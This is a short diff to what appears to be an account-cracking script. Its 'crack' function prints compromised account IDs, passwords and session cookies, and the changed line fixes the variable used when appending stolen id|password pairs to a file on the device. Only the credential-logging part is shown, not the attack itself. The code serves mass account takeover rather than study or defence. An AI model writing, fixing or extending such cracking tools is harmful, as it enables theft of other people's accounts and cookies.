@@ -501,7 +501,7 @@ def crack(idf,pwv):
 				print(f'\r\033[0;92m[SHANTO-OK] {idf} 🥰 {pw}\n\033[0;93m[🌺] = COOKIES 🐸 \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
-				open(f'/sdcard/SHANTO•OK•M1.txt', 'a').write(ids+'|'+paw+'\n')
+				open(f'/sdcard/SHANTO•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
 				cek_apk(session,coki)
 				break
 				
